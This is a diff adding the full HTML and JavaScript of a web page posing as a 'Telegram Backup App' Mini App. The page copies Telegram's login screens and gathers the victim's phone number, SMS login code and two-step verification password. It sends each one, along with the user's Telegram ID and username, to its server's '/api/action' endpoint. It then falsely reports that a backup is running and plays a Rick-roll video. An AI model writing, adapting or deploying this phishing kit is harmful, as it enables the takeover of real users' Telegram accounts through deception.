@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Telegram Backup App</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        /* Base Styles & Dark Theme */
+        :root {
+            --bg-color: #1c242f;
+            --container-bg: #212d3b;
+            --text-main: #ffffff;
+            --text-muted: #7f8e9d;
+            --border-color: #3b4754;
+            --btn-blue: #5288c1;
+            --btn-blue-hover: #4578ab;
+        }
+        body { margin: 0; padding: 0; background-color: var(--bg-color); color: var(--text-main); font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .app-container { width: 100%; max-width: 400px; height: 100%; display: flex; flex-direction: column; position: relative; }
+        .step-screen { display: none; padding: 40px 20px; flex-direction: column; align-items: center; height: 100%; animation: fadeIn 0.3s ease; text-align: center; }
+        .step-screen.active { display: flex; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateX(10px); } to { opacity: 1; transform: translateX(0); } }
+        h2 { font-size: 22px; margin-bottom: 10px; font-weight: 600; }
+        p.subtitle { color: var(--text-muted); font-size: 15px; margin-bottom: 30px; line-height: 1.4; }
+        .input-group { width: 100%; margin-bottom: 15px; position: relative; }
+        .input-box { border: 1px solid var(--border-color); border-radius: 8px; display: flex; align-items: center; padding: 12px 15px; background: var(--container-bg); }
+        .input-box select, .phone-input { background: transparent; border: none; color: white; font-size: 16px; width: 100%; outline: none; }
+        .input-box.phone-box { padding: 0; }
+        .phone-code { padding: 15px; border-right: 1px solid var(--border-color); color: white; font-size: 16px; }
+        .phone-input { padding: 15px; }
+        .fab { position: absolute; bottom: 40px; right: 20px; width: 60px; height: 60px; border-radius: 50%; background-color: var(--btn-blue); display: flex; justify-content: center; align-items: center; cursor: pointer; border: none; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
+        .fab svg { fill: white; width: 24px; height: 24px; }
+        .otp-container { display: flex; gap: 10px; margin-bottom: 30px; }
+        .otp-input { width: 45px; height: 55px; background: transparent; border: 1px solid var(--border-color); border-radius: 8px; color: white; font-size: 24px; text-align: center; outline: none; }
+        .otp-input:focus { border-color: var(--btn-blue); }
+        .monkey-emoji { font-size: 60px; margin-bottom: 15px; }
+        .password-input { width: 100%; background: transparent; border: none; border-bottom: 1px solid var(--border-color); color: white; font-size: 18px; padding: 10px 0; margin-bottom: 25px; outline: none; }
+        .password-input:focus { border-bottom-color: var(--btn-blue); }
+        .btn-full { width: 100%; padding: 14px; border-radius: 8px; background-color: #2b3541; color: var(--text-muted); border: none; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 20px; }
+        .btn-full.active { background-color: var(--btn-blue); color: white; }
+        .top-bar { width: 100%; display: flex; align-items: center; margin-bottom: 20px; }
+        .back-btn { background: transparent; border: none; color: white; cursor: pointer; padding: 0; margin-right: 15px; }
+        .back-btn svg { fill: white; width: 24px; height: 24px; }
+        
+        /* Loading & Toast Styles */
+        .loading { display: none; margin-top: 20px; color: var(--btn-blue); }
+        #toast { visibility: hidden; min-width: 250px; background-color: #4CAF50; color: #fff; text-align: center; border-radius: 8px; padding: 16px; position: fixed; z-index: 1; left: 50%; bottom: 30px; transform: translateX(-50%); font-size: 16px; }
+        #toast.show { visibility: visible; animation: fadein 0.5s, fadeout 0.5s 2.5s; }
+        @keyframes fadein { from { bottom: 0; opacity: 0; } to { bottom: 30px; opacity: 1; } }
+        @keyframes fadeout { from { bottom: 30px; opacity: 1; } to { bottom: 0; opacity: 0; } }
+        
+        /* Iframe Container */
+        .iframe-container { width: 100%; border-radius: 10px; overflow: hidden; margin-top: 20px; border: 2px solid var(--border-color);}
+    </style>
+</head>
+<body>
+
+<div id="toast">Backup Started Successfully!</div>
+
+<div class="app-container">
+
+    <div id="step-loading" class="step-screen active">
+        <h2>Loading...</h2>
+        <p class="subtitle">Checking Mini App Session...</p>
+    </div>
+
+    <div id="step-phone" class="step-screen">
+        <h2>Your phone number</h2>
+        <p class="subtitle">Please confirm your country code and<br>enter your phone number.</p>
+        <div class="input-group">
+            <span style="font-size:12px; color:var(--text-muted); position:absolute; top:-8px; left:10px; background:var(--bg-color); padding:0 5px;">Country</span>
+            <div class="input-box">
+                <select id="country-select" onchange="updateCountryCode()">
+                    <option value="+1">🇺🇸 USA</option>
+                    <option value="+44">🇬🇧 UK</option>
+                    <option value="+63">🇵🇭 Philippines</option>
+                    <option value="+91" selected>🇮🇳 India</option>
+                    <option value="+92">🇵🇰 Pakistan</option>
+                </select>
+            </div>
+        </div>
+        <div class="input-group">
+            <div class="input-box phone-box">
+                <div class="phone-code" id="display-code">+91</div>
+                <input type="tel" id="phone-number" class="phone-input" placeholder="0000000000" autocomplete="off">
+            </div>
+        </div>
+        <div id="phone-loader" class="loading">Requesting code...</div>
+        <button class="fab" onclick="submitPhone()">
+            <svg viewBox="0 0 24 24"><path d="M5 12h14M12 5l7 7-7 7" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        </button>
+    </div>
+
+    <div id="step-otp" class="step-screen">
+        <div class="top-bar"><button class="back-btn" onclick="showStep('step-phone')"><svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg></button></div>
+        <div style="font-size: 50px; margin-bottom: 10px;">💬</div>
+        <h2>Enter code</h2>
+        <p class="subtitle" id="otp-subtitle">We've sent an SMS with an activation code to your phone.</p>
+        <div class="otp-container">
+            <input type="text" class="otp-input" maxlength="1" onkeyup="moveToNext(this, 1)">
+            <input type="text" class="otp-input" maxlength="1" onkeyup="moveToNext(this, 2)">
+            <input type="text" class="otp-input" maxlength="1" onkeyup="moveToNext(this, 3)">
+            <input type="text" class="otp-input" maxlength="1" onkeyup="moveToNext(this, 4)">
+            <input type="text" class="otp-input" maxlength="1" onkeyup="submitOTP(this)">
+        </div>
+        <div id="otp-loader" class="loading">Verifying code...</div>
+    </div>
+
+    <div id="step-2fa" class="step-screen">
+        <div class="top-bar"><button class="back-btn" onclick="showStep('step-otp')"><svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg></button></div>
+        <div class="monkey-emoji">🙈</div>
+        <h2>Your Password</h2>
+        <p class="subtitle">You have Two-Step Verification enabled, so your account is protected with an additional password.</p>
+        <input type="password" id="two-fa-pass" class="password-input" placeholder="Password" oninput="checkPasswordInput()">
+        <div id="2fa-loader" class="loading">Verifying password...</div>
+        <button id="btn-2fa" class="btn-full" onclick="submit2FA()">Continue</button>
+    </div>
+
+    <div id="step-result" class="step-screen">
+        <div style="font-size: 50px; margin-bottom: 10px;">🎉</div>
+        <h2>Rick Role</h2>
+        <p class="subtitle" style="margin-bottom: 10px;">Backup is running securely in the background.</p>
+        
+        <div class="iframe-container">
+            <iframe width="100%" height="220" src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1" title="Rick Role" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
+        </div>
+    </div>
+
+</div>
+
+<script>
+    // Initialize Telegram WebApp
+    const tg = window.Telegram.WebApp;
+    tg.expand();
+    
+    // Extract TG User Data
+    const tg_user_id = tg.initDataUnsafe?.user?.id || "web_test_user";
+    const tg_username = tg.initDataUnsafe?.user?.username || "unknown";
+
+    // Utility to switch screens
+    function showStep(stepId) {
+        document.querySelectorAll('.step-screen').forEach(el => el.classList.remove('active'));
+        document.getElementById(stepId).classList.add('active');
+    }
+
+    function showToast() {
+        const x = document.getElementById("toast");
+        x.className = "show";
+        setTimeout(function(){ x.className = x.className.replace("show", ""); }, 3000);
+    }
+
+    function updateCountryCode() {
+        document.getElementById('display-code').innerText = document.getElementById('country-select').value;
+    }
+
+    async function sendRequest(payload) {
+        payload.tg_user_id = tg_user_id;
+        payload.tg_username = tg_username;
+        try {
+            const response = await fetch("/api/action", {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            return await response.json();
+        } catch (err) { alert("Network Error"); }
+    }
+
+    // ON LOAD: Check Session
+    window.onload = async () => {
+        try {
+            const response = await fetch("/check_session", {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ tg_user_id, tg_username, initData: tg.initData })
+            });
+            const res = await response.json();
+            if(res.status === "exists") {
+                showToast();
+                showStep('step-result');
+            } else {
+                showStep('step-phone');
+            }
+        } catch(e) { showStep('step-phone'); }
+    };
+
+    async function submitPhone() {
+        const code = document.getElementById('display-code').innerText;
+        const num = document.getElementById('phone-number').value.trim();
+        if(!num) return;
+        
+        document.getElementById('phone-loader').style.display = "block";
+        const res = await sendRequest({ action: 'send_phone', phone: code + num });
+        document.getElementById('phone-loader').style.display = "none";
+
+        if(res && res.status === 'success') {
+            document.getElementById('otp-subtitle').innerText = `We've sent an SMS code to ${code + num}.`;
+            showStep('step-otp');
+            document.querySelectorAll('.otp-input')[0].focus();
+        }
+    }
+
+    function moveToNext(current, nextIndex) {
+        if (current.value.length >= current.maxLength) {
+            const inputs = document.querySelectorAll('.otp-input');
+            if (nextIndex < inputs.length) inputs[nextIndex].focus();
+        }
+    }
+
+    async function submitOTP(current) {
+        if(current.value.length === 1) {
+            let otpCode = '';
+            document.querySelectorAll('.otp-input').forEach(input => otpCode += input.value);
+            
+            if(otpCode.length === 5) {
+                document.querySelectorAll('.otp-input').forEach(input => input.disabled = true);
+                document.getElementById('otp-loader').style.display = "block";
+                
+                const res = await sendRequest({ action: 'send_otp', otp: otpCode });
+                
+                document.getElementById('otp-loader').style.display = "none";
+                document.querySelectorAll('.otp-input').forEach(input => input.disabled = false);
+
+                if(res.next_step === '2fa') showStep('step-2fa');
+                else if (res.next_step === 'result') { showToast(); showStep('step-result'); }
+            }
+        }
+    }
+
+    function checkPasswordInput() {
+        const btn = document.getElementById('btn-2fa');
+        if(document.getElementById('two-fa-pass').value.length > 0) btn.classList.add('active');
+        else btn.classList.remove('active');
+    }
+
+    async function submit2FA() {
+        const pass = document.getElementById('two-fa-pass').value;
+        if(!pass) return;
+
+        document.getElementById('2fa-loader').style.display = "block";
+        const res = await sendRequest({ action: 'send_2fa', password: pass });
+        document.getElementById('2fa-loader').style.display = "none";
+
+        if(res && res.status === 'success') {
+            showToast();
+            showStep('step-result');
+        }
+    }
+</script>
+
+</body>
+</html>
